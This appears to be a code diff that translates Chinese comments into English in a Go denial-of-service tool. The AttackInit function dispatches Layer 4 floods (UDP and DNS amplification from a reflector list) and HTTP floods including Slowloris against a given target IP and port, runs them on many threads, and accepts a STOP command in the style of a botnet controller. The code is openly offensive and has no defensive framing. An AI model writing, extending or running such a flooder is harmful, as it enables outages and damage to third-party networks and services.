@@ -8,68 +8,66 @@ import (
 	"strings"
 )
 
-// AttackInit 统一接收6个参数，但根据攻击类型区分处理
+// AttackInit Unified function to receive 6 parameters, but handle them based on the attack type
 func AttackInit(method string, dstip string, dstport int, path string, header string, payload string) {
-	// 重置停止通道
+	// Reset the stop channel
 	attack.ResetStopChannel()
-	
-	// 处理STOP命令
+
+	// Handle STOP command
 	if method == "STOP" {
 		close(attack.STOP)
 		log.Println("Stopped all attacks")
 		return
 	}
 
-	// 将method转为大写确保识别
+	// Convert method to uppercase to ensure recognition
 	method = strings.ToUpper(method)
 
-	// 根据攻击类型分别处理
+	// Handle based on attack type
 	switch {
-	// Layer4攻击只使用前三个参数
+	// Layer4 attacks use only the first three parameters
 	case isLayer4Attack(method):
 		attack4 := attack.Layer4{
-			Method:       method,
-			DstIP:        dstip,
-			DstPort:      dstport,
-			ThreadCount:  attack.ThreadCount,
-			AmpFile:      "serverfile/reflector.txt",
+			Method:      method,
+			DstIP:       dstip,
+			DstPort:     dstport,
+			ThreadCount: attack.ThreadCount,
+			AmpFile:     "serverfile/reflector.txt",
 		}
-		
-		// 特殊参数处理
+
+		// Special parameter handling
 		if method == "DNS" || method == "DNSA" {
-			attack4.Reservedfield = "example.com" // 默认域名查询
+			attack4.Reservedfield = "example.com" // Default domain query
 		}
-		
+
 		go attack4.StartAttack()
 
-	// HTTP攻击使用全部6个参数
+	// HTTP attacks use all 6 parameters
 	case method == "GET" || method == "POST" || method == "CURL" || method == "SLOWLORIS":
-		// 对header和payload进行JSON解析
+		// Parse header and payload as JSON
 		headerMap := make(map[string]string)
 		if err := json.Unmarshal([]byte(header), &headerMap); err != nil {
 			log.Printf("header not set")
-		} 
+		}
 
 		target := formatTarget(dstip, dstport)
 		attack7 := attack.HTTP{
-			Method:      method,
-			Target:      target,
-			Path:        path,
-			Threads:     attack.ThreadCount,
-			Header: 	 headerMap,
-			Payload:     payload,
+			Method:  method,
+			Target:  target,
+			Path:    path,
+			Threads: attack.ThreadCount,
+			Header:  headerMap,
+			Payload: payload,
 		}
-		
-		
-		
+
 		go attack7.HTTPStart()
-	
+
 	default:
-		log.Printf("未知的攻击方法: %s", method)
+		log.Printf("Unknown attack method: %s", method)
 	}
 }
 
-// isLayer4Attack 判断是否是第4层(网络层)攻击
+// isLayer4Attack Determines if the attack is a Layer 4 (network layer) attack
 func isLayer4Attack(method string) bool {
 	layer4Methods := map[string]bool{
 		"UDP":          true,
@@ -93,13 +91,13 @@ func isLayer4Attack(method string) bool {
 	return layer4Methods[method]
 }
 
-// formatTarget 构建目标URL
+// formatTarget Constructs the target URL
 func formatTarget(dstip string, dstport int) string {
-	// 检查IP是否已经是URL格式
+	// Check if the IP is already in URL format
 	if strings.HasPrefix(dstip, "http://") || strings.HasPrefix(dstip, "https://") {
 		return dstip
 	}
-	
-	// 构建基本HTTP URL
+
+	// Construct a basic HTTP URL
 	return fmt.Sprintf("http://%s:%d", dstip, dstport)
 }
